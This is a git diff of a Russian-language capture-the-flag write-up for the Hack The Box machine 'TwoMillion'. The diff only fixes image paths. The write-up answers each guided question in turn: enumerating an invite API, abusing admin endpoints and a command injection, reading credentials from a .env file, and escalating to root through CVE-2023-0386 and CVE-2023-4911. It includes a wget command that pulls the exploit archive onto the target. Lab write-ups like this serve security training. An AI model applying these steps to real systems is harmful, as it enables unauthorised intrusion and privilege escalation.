@@ -2,43 +2,43 @@
 
 При сканировании через nmap было выявлено 2 открытых порта
 
-![](/files_photo/TwoMillion/nmap_scan.png)
+![](files_photo/TwoMillion/nmap_scan.png)
 ответ: 2
 
 2 What is the name of the JavaScript file loaded by the `/invite` page that has to do with invite codes?
 
 После перехода на сайт `<target-ip>:80` мы попадаем на главную страницу перейдя по пути `http://2million.htb/invite` и открыв консоль разработчика мы видим файл `inviteapi.min.js` 
 
-![](/files_photo/TwoMillion/invite_api.png)
+![](files_photo/TwoMillion/invite_api.png)
 ответ: inviteapi.min.js
 
 3 What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.
 
 Перейдя в файл `inviteapi.min.js` мы видим длинную строку кода после её деобфускации видим следующий JavaScript код
 
-![](/files_photo/TwoMillion/deobfucate_jscode.png)
+![](files_photo/TwoMillion/deobfucate_jscode.png)
 ответ: makeInviteCode
 
 4 The endpoint in `makeInviteCode` returns encrypted data. That message provides another endpoint to query. That endpoint returns a `code` value that is encoded with what very common binary to text encoding format. What is the name of that encoding?
 
 После того как мы узнали нужный нам `endpoint` запускаем BurpSuite и через `Proxy` перехватываем запрос далее кидаем его в `Repeater` где получаем текст закодированный rot13 раскодировав его получаем строку в base64.
 
-![](/files_photo/TwoMillion/generate_code.png)
-![](/files_photo/TwoMillion/get_base64_code.png)
+![](files_photo/TwoMillion/generate_code.png)
+![](files_photo/TwoMillion/get_base64_code.png)
  ответ:base64
 
 5 What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?
 
 Раскодировав строку мы получаем пригласительный код после чего регистрируемся и входим в аккаунт далее идём по пути `http://2million.htb/home/access` наводимся на кнопку `Connection Pack` и видим путь до нужного api значения.
 
-![](/files_photo/TwoMillion/vpn_api.png)
+![](files_photo/TwoMillion/vpn_api.png)
 ответ: /api/v1/user/vpn/generate
 
 6 How many API endpoints are there under `/api/v1/admin`?
 
 Так же в BurpSuite подменяем путь на  /api/v1 и видим все api сайта
 
-![](/files_photo/TwoMillion/api_admin_endpoint.png)
+![](files_photo/TwoMillion/api_admin_endpoint.png)
 ответ: 3
 
 7 What API endpoint can change a user account to an admin account?
@@ -52,7 +52,7 @@
 }
 ```
 
-![](/files_photo/TwoMillion/api_admin_settings_update.png)
+![](files_photo/TwoMillion/api_admin_settings_update.png)
 ответ: /api/v1/admin/settings/update
 
 8 What API endpoint has a command injection vulnerability in it?
@@ -65,28 +65,28 @@
 }
 ```
 
-![](/files_photo/TwoMillion/vulnarability_injection.png)
+![](files_photo/TwoMillion/vulnarability_injection.png)
 ответ: /api/v1/admin/vpn/generate
 
 9 What file is commonly used in PHP applications to store environment variable values?
 
 Поискав по системе находим файл `.env`  в котором содержится пароль и логин попробуем его для входа в 22 ssh порт
 
-![](/files_photo/TwoMillion/env_file.png)
+![](files_photo/TwoMillion/env_file.png)
 ответ: .env
 
 10 Submit the flag located in the admin user's home directory.
 
 После подключения вводим `cat user.txt` и получаем первый флаг
 
-![](/files_photo/TwoMillion/userflag.png)
+![](files_photo/TwoMillion/userflag.png)
 
 
 11 What is the email address of the sender of the email sent to admin?
 
 Далее с помощью команды ищем письма адресованные админу `find / -name "admin" -o name "email" -o -name "mail" -type f 2>/dev/null` и находим одно письмо в директории `/var/mail`
  
-![](/files_photo/TwoMillion/admin_mail.png)
+![](files_photo/TwoMillion/admin_mail.png)
 ответ: `ch4p@2million.htb`
 
 12 What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?
@@ -104,14 +104,14 @@ Hey admin,  I'm know you're working as fast as you can to do the DB migration. W
 
 Мы узнаём что есть некая уязвимость на файловую систему OverlayFS после поиска в интернете натыкаемся на CVE-2023-0386
 
-![](/files_photo/TwoMillion/cve_id.png)
+![](files_photo/TwoMillion/cve_id.png)
 ответ: CVE-2023-0386
 
 13 Submit the flag located in root's home directory.
 
 После чего скачиваем git репозиторий на хост и архивируем директорию с помощью `tar` после архивации  поднимаем python server далее на машине с помощью команды `wget http://<openvpn-ip>:80/CVE-2023-0386.tar.bz2` копируем её и разархивируем `tar -xvf CVE-2023-0386.tar.bz2` далее действуем по инструкции написаной в эксплойте
 
-![](/files_photo/TwoMillion/rootflag.png)
+![](files_photo/TwoMillion/rootflag.png)
 
 
 В качестве альтернативы получения root доступа воспользуемся уявзвимостью в Glib она называется "Looney Tunables" `CVE-2023-4911` 
@@ -120,14 +120,14 @@ Hey admin,  I'm know you're working as fast as you can to do the DB migration. W
 
 Узнаём что glib имеет версию `2.35`
 
-![](/files_photo/TwoMillion/ldd_version.png)
+![](files_photo/TwoMillion/ldd_version.png)
 ответ: 2.35
 
 15 [Alternative Priv Esc] What is the CVE ID for the 2023 buffer overflow vulnerability in the GNU C dynamic loader?
 
 После того как мы нашли версию ещем PoC и известные CVE.
 
-![](/files_photo/TwoMillion/cve_id_GLIB.png)
+![](files_photo/TwoMillion/cve_id_GLIB.png)
 ответ: CVE-2023-4911
 
 16 [Alternative Priv Esc] With a shell as admin or www-data, find a POC for Looney Tunables. What is the name of the environment variable that triggers the buffer overflow? After answering this question, run the POC and get a shell as root.
@@ -135,4 +135,4 @@ Hey admin,  I'm know you're working as fast as you can to do the DB migration. W
 После этого пробуем PoC и получаем root 
 `так как CVE работает не всегда в моём случае он не сработал но у вас она может работать без проблем`
 
-![](/files_photo/TwoMillion/denied_root.png)
+![](files_photo/TwoMillion/denied_root.png)
